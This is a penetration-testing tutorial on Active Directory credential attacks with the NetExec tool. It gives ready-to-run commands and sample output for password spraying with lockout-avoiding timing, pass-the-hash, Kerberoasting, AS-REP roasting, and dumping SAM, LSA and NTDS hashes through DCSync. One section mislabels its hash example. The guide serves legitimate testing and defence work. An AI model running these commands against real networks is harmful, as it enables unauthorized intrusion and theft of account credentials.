# Credential Attacks with NXC

## Password Spraying

Password spraying is the technique of trying a single password (or small number of passwords) against many user accounts simultaneously. Unlike brute-force, which tries many passwords against one account, spraying minimizes the risk of account lockouts.

### Basic Password Spray

```bash
# Spray one password against a list of users
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!'
```

**Example output:**
```
SMB         192.168.1.10    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.1.10    445    DC01             [-] CORP.LOCAL\administrator:Summer2024! STATUS_LOGON_FAILURE
SMB         192.168.1.10    445    DC01             [-] CORP.LOCAL\jsmith:Summer2024! STATUS_LOGON_FAILURE
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\svc_sql:Summer2024!
SMB         192.168.1.10    445    DC01             [-] CORP.LOCAL\admin.jones:Summer2024! STATUS_LOGON_FAILURE
```

By default, NXC **stops after the first successful authentication**. To continue testing all users:

### Continue on Success

```bash
# Keep spraying even after finding valid credentials
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success
```

**Example output with multiple hits:**
```
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\svc_sql:Summer2024!
SMB         192.168.1.10    445    DC01             [-] CORP.LOCAL\admin.jones:Summer2024! STATUS_LOGON_FAILURE
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\t.williams:Summer2024!
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\m.garcia:Summer2024!
```

### Multiple Passwords

```bash
# Spray multiple passwords (each user tries all passwords before moving to next)
nxc smb 192.168.1.10 -u users.txt -p passwords.txt --continue-on-success

# Spray multiple passwords from command line
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' -p 'Winter2023!' -p 'Company1!' --continue-on-success
```

### No Brute Force Mode

```bash
# Pair each username with its corresponding password line by line (user1:pass1, user2:pass2, etc.)
nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce
```

This is useful when you have a list of credential pairs from a breach database or phishing campaign.

### Account Lockout Awareness

**CRITICAL: Always check the password policy before spraying.**

```bash
# Step 1: Get the password policy
nxc smb 192.168.1.10 -u jsmith -p 'Password123' --pass-pol

# If lockout threshold is 5 and reset is 30 minutes:
# Try 2-3 passwords maximum, then wait 35+ minutes

# Step 2: Spray conservatively
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --continue-on-success
# WAIT 35 minutes
nxc smb 192.168.1.10 -u users.txt -p 'Winter2023!' --continue-on-success
```

### Timing Considerations

```bash
# Use jitter/delay between attempts (in seconds)
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --jitter 3

# Reduce threads to slow down spraying
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' -t 1
```

### Common Password Patterns for Spraying

Effective passwords to try (in order of likelihood):
1. `Season+Year` — Summer2024!, Winter2023!, Spring2024!
2. `CompanyName+123` — Contoso123!, Corp2024!
3. `Month+Year` — January2024!, March2024!
4. `Password+Number` — Password1!, Password123
5. `Welcome+Number` — Welcome1!, Welcome123

---

## Credential Validation Across Multiple Hosts

Once you have valid credentials, check where they grant access across the network:

```bash
# Check admin access across the entire subnet
nxc smb 192.168.1.0/24 -u svc_sql -p 'Summer2024!'
```

**Example output:**
```
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\svc_sql:Summer2024!
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\svc_sql:Summer2024!
SMB         192.168.1.25    445    SQL01            [+] CORP.LOCAL\svc_sql:Summer2024! (Pwn3d!)
SMB         192.168.1.30    445    FILE01           [+] CORP.LOCAL\svc_sql:Summer2024!
```

Note: `(Pwn3d!)` on SQL01 means svc_sql has local admin on the SQL server — a common finding since service accounts often have excessive permissions.

---

## Hash Formats NXC Accepts

NXC supports authentication using NTLM hashes instead of plaintext passwords.

### NT Hash Only

```bash
# Authenticate with just the NT hash (32 hex characters)
nxc smb 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```

### LM:NT Format

```bash
# Full LM:NT hash (LM hash is usually aad3b435b51404ee for empty/disabled)
nxc smb 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```

### NT Hash Only (short form)

```bash
# Just the NT portion (NXC accepts this too)
nxc smb 192.168.1.10 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```

### Hash from File

```bash
# File containing hashes (one per line)
nxc smb 192.168.1.10 -u administrator -H hashes.txt
```

---

## Pass-the-Hash (PTH)

Pass-the-Hash allows authentication using NTLM hashes without knowing the plaintext password. This is one of the most powerful techniques for lateral movement.

### Basic PTH

```bash
nxc smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99'
```

**Example output:**
```
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\administrator:5f4dcc3b5aa765d61d8327deb882cf99 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:5f4dcc3b5aa765d61d8327deb882cf99 (Pwn3d!)
SMB         192.168.1.25    445    SQL01            [+] CORP.LOCAL\administrator:5f4dcc3b5aa765d61d8327deb882cf99 (Pwn3d!)
```

### PTH with Local Authentication

```bash
# Use local admin hash found from SAM dump
nxc smb 192.168.1.0/24 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' --local-auth
```

### When PTH Works

PTH requires:
- The target accepts NTLM authentication (not Kerberos-only)
- The account is a local administrator on the target (for privileged operations)
- SMB is accessible (port 445)
- If using the built-in Administrator (RID 500), PTH always works for local admin even with UAC remote restrictions
- For other local admin accounts, `LocalAccountTokenFilterPolicy` must be set to 1 (or the account must be RID 500)

### SMB Signing Implications

PTH authentication works regardless of SMB signing. However:
- SMB signing protects against relay attacks, not against direct PTH
- PTH authenticates directly with the hash — signing doesn't prevent this
- The hash was already stolen; PTH uses it to authenticate legitimately

---

## Pass-the-Ticket (PTT) with Kerberos

NXC supports authentication using Kerberos tickets (.ccache files):

```bash
# Set the Kerberos ticket cache
export KRB5CCNAME=/tmp/administrator.ccache

# Authenticate using the cached ticket
nxc smb dc01.corp.local -k --use-kcache

# With command execution
nxc smb dc01.corp.local -k --use-kcache -x 'whoami'
```

### Requirements for Kerberos/PTT

- Target must be specified by hostname, not IP (Kerberos requires hostnames)
- `/etc/krb5.conf` must be configured with the domain realm
- The .ccache file must contain a valid, non-expired TGT or service ticket
- DNS must resolve the domain controller

---

## Kerberoasting via NXC

Kerberoasting extracts service ticket hashes for offline cracking. Any domain user can request these tickets.

```bash
# Kerberoast all SPNs in the domain
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --kerberoasting output_kerberoast.txt
```

**Example output:**
```
LDAP        192.168.1.10    389    DC01             [+] CORP.LOCAL\jsmith:Password123
LDAP        192.168.1.10    389    DC01             [*] Total of records returned: 3
LDAP        192.168.1.10    389    DC01             svc_sql - MSSQLSvc/sql01.corp.local:1433
LDAP        192.168.1.10    389    DC01             svc_http - HTTP/web01.corp.local
LDAP        192.168.1.10    389    DC01             svc_backup - cifs/file01.corp.local
```

The output file contains hashcat/john-compatible hashes:

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a1b2c3d4...
```

Crack with hashcat:
```bash
hashcat -m 13100 output_kerberoast.txt /usr/share/wordlists/rockyou.txt
```

---

## AS-REP Roasting via NXC

AS-REP roasting targets accounts with Kerberos pre-authentication disabled:

```bash
# AS-REP roast
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --asreproast output_asrep.txt
```

**Example output:**
```
LDAP        192.168.1.10    389    DC01             [+] CORP.LOCAL\jsmith:Password123
LDAP        192.168.1.10    389    DC01             [*] Total of records returned: 1
LDAP        192.168.1.10    389    DC01             svc_legacy - UF_DONT_REQUIRE_PREAUTH
```

The output file contains hashcat-compatible AS-REP hashes:

```
$krb5asrep$23$svc_legacy@CORP.LOCAL:a1b2c3d4...
```

Crack with hashcat:
```bash
hashcat -m 18200 output_asrep.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting Without Credentials

If you have a username list but no password, you can check for AS-REP roastable accounts:

```bash
# Try without valid credentials (only finds accounts with pre-auth disabled)
nxc ldap 192.168.1.10 -u users.txt -p '' --asreproast output_asrep.txt
```

---

## Secretsdump: SAM, LSA, and NTDS

Extracting credentials from compromised hosts is a core NXC capability.

### SAM Database Dump (--sam)

The SAM database contains local user account hashes. Requires local admin.

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' --sam
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Dumping SAM hashes
SMB         192.168.1.20    445    WS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
SMB         192.168.1.20    445    WS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.1.20    445    WS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.1.20    445    WS01             localadmin:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
```

### LSA Secrets Dump (--lsa)

LSA secrets may contain service account passwords, cached domain credentials, and other secrets:

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' --lsa
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Dumping LSA secrets
SMB         192.168.1.20    445    WS01             CORP.LOCAL/svc_sql:$DCC2$10240#svc_sql#a1b2c3d4e5f6...
SMB         192.168.1.20    445    WS01             CORP\WS01$:aes256-cts-hmac-sha1-96:abcdef0123456789...
SMB         192.168.1.20    445    WS01             CORP\WS01$:aes128-cts-hmac-sha1-96:fedcba9876543210...
SMB         192.168.1.20    445    WS01             dpapi_machinekey:0x1a2b3c4d5e6f...
SMB         192.168.1.20    445    WS01             NL$KM:0xaabbccdd...
```

### NTDS.dit Dump — DCSync (--ntds)

This is the most powerful credential extraction technique. It dumps the entire Active Directory database (NTDS.dit) using the DCSync technique. **Requires Domain Admin or equivalent privileges.**

```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123' --ntds
```

**Example output:**
```
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.10    445    DC01             [*] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.1.10    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
SMB         192.168.1.10    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.1.10    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b7a9c5b2c0d5e8f6a1b2c3d4e5f6a7b8:::
SMB         192.168.1.10    445    DC01             CORP.LOCAL\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         192.168.1.10    445    DC01             CORP.LOCAL\svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6789012345678abcdef01:::
SMB         192.168.1.10    445    DC01             CORP.LOCAL\admin.jones:1106:aad3b435b51404eeaad3b435b51404ee:fedcba9876543210fedcba9876543210:::
```

### NTDS with Password Last Set (--ntds --ntds-pwdLastSet)

```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123' --ntds --ntds-pwdLastSet
```

This adds the password last set date to each hash line, useful for identifying stale passwords.

### NTDS with History (--ntds --ntds-history)

```bash
nxc smb 192.168.1.10 -u administrator -p 'Password123' --ntds --ntds-history
```

This dumps previous password hashes as well, useful for password reuse analysis.

### DCSync via Hash

```bash
# DCSync using a hash instead of password
nxc smb 192.168.1.10 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99' --ntds
```

### What is DCSync?

DCSync is a technique that impersonates a domain controller and requests password replication data using the MS-DRSR (Directory Replication Service Remote) protocol. It does **not** require code execution on the DC — it works purely over the network.

**Requirements:**
- The authenticated account must have one of these privileges:
  - Domain Admins
  - Enterprise Admins
  - The "Replicating Directory Changes" and "Replicating Directory Changes All" permissions
- Network access to the domain controller on port 445 (SMB) and 135 (RPC)

**What defenders see:**
- Event ID 4662: An operation was performed on an object (with specific replication GUIDs)
- Network traffic on MS-DRSR/RPC protocols
- This is detectable by advanced SIEMs and ATA/ATP
